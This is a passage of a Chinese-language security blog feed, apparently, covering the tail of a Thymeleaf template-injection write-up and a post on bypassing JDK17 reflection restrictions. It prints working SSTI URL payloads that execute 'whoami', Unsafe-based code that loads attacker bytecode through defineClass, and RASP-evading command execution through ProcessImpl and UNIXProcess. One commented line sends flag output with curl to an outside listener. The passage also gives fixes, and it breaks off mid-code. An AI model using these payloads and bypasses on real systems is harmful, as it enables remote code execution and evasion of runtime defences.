class="hljs-string">&quot;Retrieving &quot;</span> + document);    <span class="hljs-comment">//returns void, so view name is taken from URI</span>&#125;</code></pre></div><p>按理说没有返回值<code>ModelAndView</code>应该为空，但实际上<code>DispatcherServlet#doDispatch</code>中，获取<code>ModleAndView</code>后还会执行<code>applyDefaultViewName</code>方法</p><p><code>applyDefaultViewName</code>中判断当<code>ModelAndView</code>为空，则通过<code>getDefaultViewName</code><br>获取<strong>请求路径</strong>作为<code>ViewName</code></p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><p>有回显</p><div class="code-wrapper"><pre><code class="hljs llvm">/doc/__$<span class="hljs-variable">%7</span>bnew<span class="hljs-variable">%20</span>java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-variable">%22</span>whoami<span class="hljs-variable">%22</span>).getInputStream()).next()<span class="hljs-variable">%7</span>d__::<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre></div><p>若是执行calc这种</p><p>只需要一个<code>.</code>即可</p><div class="code-wrapper"><pre><code class="hljs xquery">/doc/_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22whoami</span><span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__::</span>.</code></pre></div><h4 id="无回显payload情况"><a href="#无回显payload情况" class="headerlink" title="无回显payload情况"></a>无回显payload情况</h4><div class="code-wrapper"><pre><code class="hljs xquery">/doc/_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22whoami</span><span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__::</span>.x</code></pre></div><p>在<code>StandardExpressionParser#parseExpression</code>,在<code>preprocess</code>预处理结束后还会通过<code>Expression.parse</code>进行一次解析，这里如果解析失败则不会回显。</p><p>下断点可以看到<code>::</code>后没有内容，因此这里肯定是会失败的</p><p><strong>但是我们在错误POC中也设置了::.x为什么会被去掉呢？</strong></p><p><code>transformPath</code>中通过<code>stripFilenameExtension</code>去除后缀，是这部分导致了<code>.x</code>后内容为空。</p><p>因此我们只需要在<code>.</code>之前加入任意数据即可</p><p><img src="/../images/thymeleaf-ssti/image-20240113224112607.png" alt="image-20240113224112607"></p><p><img src="/../images/thymeleaf-ssti/image-20240113205602726.png" alt="image-20240113205602726"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="配置ResponseBody或RestController注解"><a href="#配置ResponseBody或RestController注解" class="headerlink" title="配置ResponseBody或RestController注解"></a>配置ResponseBody或RestController注解</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/doc/&#123;document&#125;&quot;</span>)    <span class="hljs-variable">@ResponseBody</span>    public void <span class="hljs-built_in">getDocument</span>(<span class="hljs-variable">@PathVariable</span> String document) &#123;        <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);        <span class="hljs-comment">//returns void, so view name is taken from URI</span>    &#125;</code></pre></div><h3 id="通过redirect"><a href="#通过redirect" class="headerlink" title="通过redirect:"></a>通过redirect:</h3><blockquote><p>根据springboot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p></blockquote><p>所以配置<code>redirect：</code>主要影响的是获取视图的部分。在<code>ThymeleafViewResolver#createView</code>中，如果视图名以<code>redirect:</code>开头，则会创建<code>RedirectView</code>并返回。所以不会使用<code>ThymeleafView</code>解析。</p><h3 id="方法参数中设置HttpServletResponse-参数"><a href="#方法参数中设置HttpServletResponse-参数" class="headerlink" title="方法参数中设置HttpServletResponse 参数"></a>方法参数中设置HttpServletResponse 参数</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/doc/&#123;document&#125;&quot;</span>)    public void <span class="hljs-built_in">getDocument</span>(<span class="hljs-variable">@PathVariable</span> String document, HttpServletResponse response) &#123;        <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);    &#125;</code></pre></div><blockquote><p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP<br>Response，因此不会发生视图名称解析。</p></blockquote><p>声明下 <strong>这种方式只对返回值为空的情况下有效</strong>，对有返回值的情况没有作用</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>上文所述的回显原理以及预处理表达式的相关问题同样适用于 2.x 版本</p><p>其实也就懂了一点分析流程，对于那些具体的templateName和selector仍然是没有理解，唉。。。</p><p>分析流程看参考文章里的吧，自己也不知道怎么写</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p><p><a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p><p><a href="https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JDK17+绕过反射限制</title>
    <link href="/2023/12/28/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/"/>
    <url>/2023/12/28/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="JDK17-反射绕过限制"><a href="#JDK17-反射绕过限制" class="headerlink" title="JDK17+ 反射绕过限制"></a>JDK17+ 反射绕过限制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>springboot3.x使用的jdk版本至少是jdk17，在jdk17及之后无法反射 <code>java.*</code> 包下非<code>public</code> 修饰的属性和方法</p><p>根据 <a href="https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B">Oracle的文档</a>，为了安全性，从JDK 17开始对java本身代码使用强封装，原文叫 <strong>Strong Encapsulation</strong>。任何对 <code>java.*</code> 代码中的<strong>非public</strong>变量和方法进行反射会抛出InaccessibleObjectException异常。</p><p><a href="https://openjdk.org/jeps/403">JDK的文档</a>解释了对java api进行封装的两个理由：</p><ol><li>对java代码进行反射是不安全的，比如可以调用ClassLoader的defineClass方法，这样在运行时候可以给程序注入任意代码。</li><li>java的这些非公开的api本身就是非标准的，让开发者依赖使用这个api会给JDK的维护带来负担。</li></ol><p>所以从JDK 9开始就准备限制对java api的反射进行限制，直到JDK 17才正式禁用。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>调用ClassLoader.defineClass加载字节码</p><div class="code-wrapper"><pre><code class="hljs reasonml">String payload = &#x27;恶意的base64&#x27;byte<span class="hljs-literal">[]</span> decode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(payload);Method defineClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-params">class</span>, <span class="hljs-params">byte</span>[].<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>)</span>;defineClass.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;Class evil = (Class) defineClass.invoke(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>, <span class="hljs-string">&quot;恶意文件名字&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);</code></pre></div><h2 id="JDK9-JDK16（只有警告）"><a href="#JDK9-JDK16（只有警告）" class="headerlink" title="JDK9 - JDK16（只有警告）"></a>JDK9 - JDK16（只有警告）</h2><p>从JDK9开始，当我们用反射去获取 <code>java.*</code> 包下的非public变量和方法时只会警告，仍能够运行</p><div class="code-wrapper"><pre><code class="hljs none">WARNING: An illegal reflective access operation has occurredWARNING: Illegal reflective access by org.example.Main (file:/E:/test/test/target/classes/) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int)WARNING: Please consider reporting this to the maintainers of org.example.MainWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operationsWARNING: All illegal access operations will be denied in a future release</code></pre></div><h2 id="JDK17-对反射的限制"><a href="#JDK17-对反射的限制" class="headerlink" title="JDK17+对反射的限制"></a>JDK17+对反射的限制</h2><p>报以下错误，无法运行</p><div class="code-wrapper"><pre><code class="hljs stylus">Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.InaccessibleObjectException</span>: Unable to make protected final java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Class</span> java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ClassLoader</span><span class="hljs-selector-class">.defineClass</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>,byte<span class="hljs-selector-attr">[]</span>,int,int) throws java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ClassFormatError</span> accessible: module java<span class="hljs-selector-class">.base</span> does not <span class="hljs-string">&quot;opens java.lang&quot;</span> to unnamed module @<span class="hljs-number">3</span>b07d329at java.base/java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.AccessibleObject</span><span class="hljs-selector-class">.checkCanSetAccessible</span>(AccessibleObject<span class="hljs-selector-class">.java</span>:<span class="hljs-number">354</span>)at java.base/java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.AccessibleObject</span><span class="hljs-selector-class">.checkCanSetAccessible</span>(AccessibleObject<span class="hljs-selector-class">.java</span>:<span class="hljs-number">297</span>)at java.base/java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.checkCanSetAccessible</span>(Method<span class="hljs-selector-class">.java</span>:<span class="hljs-number">199</span>)at java.base/java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.setAccessible</span>(Method<span class="hljs-selector-class">.java</span>:<span class="hljs-number">193</span>)at test<span class="hljs-selector-class">.main</span>(test<span class="hljs-selector-class">.java</span>:<span class="hljs-number">11</span>)</code></pre></div><h2 id="Unsafe绕过反射限制"><a href="#Unsafe绕过反射限制" class="headerlink" title="Unsafe绕过反射限制"></a>Unsafe绕过反射限制</h2><p><a href="https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B">https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B</a></p><div class="code-wrapper"><pre><code class="hljs mipsasm">Note that the sun.misc <span class="hljs-keyword">and </span>sun.reflect packages are available for reflection <span class="hljs-keyword">by </span>tools <span class="hljs-keyword">and </span>libraries in all <span class="hljs-keyword">JDK </span>releases, including <span class="hljs-keyword">JDK </span><span class="hljs-number">17</span>.</code></pre></div><p><code>sun.misc</code>和<code>sun.reflect</code>包下的我们是可以正常反射的，所以有个关键的类就可以拿来用来，就是 <code>Unsafe</code> 这个东西</p><p>关于Unsafe类可以参考 <a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p><p>同时注意 JDK17下Unsafe类下的 <code>defineClass</code> 和 <code>defineAnonymousClass</code> 已被移除，且从jdk9开始存在的另一个Unsafe类<code>jdk.internal.misc.Unsafe</code> 也是强封装的，和 <code>java.*</code> 包下的一样。</p><p>如何利用Unsafe来打破这个强封装module限制呢？</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>跟进<code>setAccessible</code>方法</p><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228193558788.png" alt="image-20231228193558788"></p><p>如果<code>setAccessible(true)</code>就会调用<code>checkCanSetAccessible</code></p><p>继续跟进</p><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228193849841.png" alt="image-20231228193849841"></p><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228193943696.png" alt="image-20231228193943696"></p><p>这里的clazz是Class类，这个后面会用到</p><p>跟进到关键代码<code>java.lang.reflect.AccessibleObject#checkCanSetAccessible(java.lang.Class&lt;?&gt;, java.lang.Class&lt;?&gt;, boolean)</code></p><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228194145369.png" alt="image-20231228194145369"></p><p>判断我们调用类和目标类是不是一个<code>module</code>，如果<strong>调用类的module和目标类的module一样</strong>，就可以有修改权限</p><p>那我们可以尝试利用<code>Unsafe</code>来修改当前类的<code>module</code>属性和目标类(即 <code>java.*</code> 下类)的module属性一致来绕过</p><p>Unsafe类中有个 <code>getAndSetObject</code> 方法，其和反射赋值功能差不多，利用这个修改调用类的module</p><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228195535771.png" alt="image-20231228195535771"></p><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228195618276.png" alt="image-20231228195618276"></p><p>由于我们要调用<code>ClassLoader</code>类，所以我们要修改当前类的<code>module</code>为<code>ClassLoader</code>的<code>module</code></p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Module()</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Object</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Module()</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Module()</span>);</code></pre></div><p>结果都是<code>module java.base</code></p><p>接着找偏移</p><p><code>Unsafe</code>提供两个方法来获取Field的偏移量</p><p><code>staticFieldOffset(Field var1)</code>和<code>objectFieldOffset(Field var1)</code></p><div class="code-wrapper"><pre><code class="hljs reasonml">unsafe.<span class="hljs-keyword">object</span><span class="hljs-constructor">FieldOffset(Class.<span class="hljs-params">class</span>.<span class="hljs-params">getDeclaredField</span>(<span class="hljs-string">&quot;module&quot;</span>)</span>);</code></pre></div><p>这样参数都找完了</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><code>getAndSetObject</code>可以用<code>putObject</code>来替代</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);field.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<span class="hljs-type">Module</span> <span class="hljs-variable">baseModule</span> <span class="hljs-operator">=</span> Object.class.getModule();<span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> Main.class;<span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));unsafe.getAndSetObject(currentClass, addr, baseModule);<span class="hljs-comment">//        unsafe.putObject(currentClass,addr,baseModule);</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">String payload = &#x27;恶意的base64&#x27;byte<span class="hljs-literal">[]</span> decode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(payload);Class unsafeClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>)</span>;Field field = unsafeClass.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>)</span>;field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;Unsafe unsafe = (Unsafe) field.get(null);Module baseModule = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Object</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Module()</span>;Class currentClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Main</span>.</span></span><span class="hljs-keyword">class</span>;long addr = unsafe.<span class="hljs-keyword">object</span><span class="hljs-constructor">FieldOffset(Class.<span class="hljs-params">class</span>.<span class="hljs-params">getDeclaredField</span>(<span class="hljs-string">&quot;module&quot;</span>)</span>);unsafe.get<span class="hljs-constructor">AndSetObject(<span class="hljs-params">currentClass</span>, <span class="hljs-params">addr</span>, <span class="hljs-params">baseModule</span>)</span>;<span class="hljs-comment">//        unsafe.putObject(currentClass,addr,baseModule);</span>Method defineClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-params">class</span>, <span class="hljs-params">byte</span>[].<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>)</span>;defineClass.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;Class evil = (Class) defineClass.invoke(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>, <span class="hljs-string">&quot;exp&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);</code></pre></div><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228200214787.png" alt="image-20231228200214787"></p><p>对比一下没改之前的情况</p><p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228200309284.png" alt="image-20231228200309284"></p><p>所以成功修改，就能够进行反射了</p><p>同样的，如果没有办法反射其他不在同一个module下的属性或方法，也可以利用这个办法来修改类的module来绕过，上面也可以修改<code>java.*</code> 下类的module和Main.class的module一样，也是可以的，但修改module后会产生什么不可预知的后果我就不知道了。</p><h1 id="JDK8中Unsafe的常见使用"><a href="#JDK8中Unsafe的常见使用" class="headerlink" title="JDK8中Unsafe的常见使用"></a>JDK8中Unsafe的常见使用</h1><h2 id="allocateInstance-（反射调用native方法）"><a href="#allocateInstance-（反射调用native方法）" class="headerlink" title="allocateInstance （反射调用native方法）"></a>allocateInstance （反射调用native方法）</h2><p>若RASP限制了某些类的构造方法（比如<code>TrAXFilter</code>（加载字节码）、<code>ProcessImpl</code>（Windows命令执行）、<code>UnixProcess</code>（Linux命令执行））</p><p>可以用<code>Unsafe</code>的<code>allocateInstance</code>方法绕过这个限制</p><p>windows下</p><div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);field.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<span class="hljs-type">Module</span> <span class="hljs-variable">baseModule</span> <span class="hljs-operator">=</span> Object.class.getModule();<span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));unsafe.getAndSetObject(test.class, addr, baseModule);Class&lt;?&gt; processImpl = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) unsafe.allocateInstance(processImpl);<span class="hljs-type">Method</span> <span class="hljs-variable">create</span> <span class="hljs-operator">=</span> processImpl.getDeclaredMethod(<span class="hljs-string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="hljs-type">long</span>[].class, <span class="hljs-type">boolean</span>.class);create.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">long</span>[] stdHandles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]&#123;-<span class="hljs-number">1L</span>, -<span class="hljs-number">1L</span>, -<span class="hljs-number">1L</span>&#125;;create.invoke(process, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, stdHandles, <span class="hljs-literal">false</span>);</code></pre></div><p>Linux</p><div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; claz = Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> claz.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);field.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<span class="hljs-type">Module</span> <span class="hljs-variable">baseModule</span> <span class="hljs-operator">=</span> Object.class.getModule();<span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));unsafe.getAndSetObject(test.class, addr, baseModule);<span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-type">int</span>[] ineEmpty = &#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(clazz);<span class="hljs-type">Field</span> <span class="hljs-variable">helperpath</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);helperpath.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> helperpath.get(obj);<span class="hljs-type">byte</span>[] prog = <span class="hljs-string">&quot;/bin/bash\u0000&quot;</span>.getBytes();<span class="hljs-type">String</span> <span class="hljs-variable">paramCmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;-c\u0000&quot;</span> + cmd + <span class="hljs-string">&quot;\u0000&quot;</span>;<span class="hljs-type">byte</span>[] argBlock = paramCmd.getBytes();<span class="hljs-type">int</span> <span class="hljs-variable">argc</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class);exec.setAccessible(<span class="hljs-literal">true</span>);exec.invoke(obj, <span class="hljs-number">2</span>, path, prog, argBlock, argc, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, ineEmpty, <span class="hljs-literal">false</span>);</code></pre></div><h2 id="unsafe-反射调用native的forkAndExec"><a href="#unsafe-反射调用native的forkAndExec" class="headerlink" title="unsafe+反射调用native的forkAndExec"></a>unsafe+反射调用native的forkAndExec</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];        System.arraycopy(bytes, <span class="hljs-number">0</span>,                result, <span class="hljs-number">0</span>,                bytes.length);        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;        <span class="hljs-keyword">return</span> result;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] strs)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchMethodException, InvocationTargetException, IOException &#123;        <span class="hljs-comment">//String[] strs = new String[] &#123;&quot;bash&quot;, &quot;-c&quot;, &quot;curl host.docker.internal:4444 -d \&quot;`/readflag`\&quot;&quot;&#125;;</span>                        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);        &#125;        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span>        <span class="hljs-comment">// memory management in Java than in C.</span>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];        <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();            size += args[i].length;        &#125;        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;            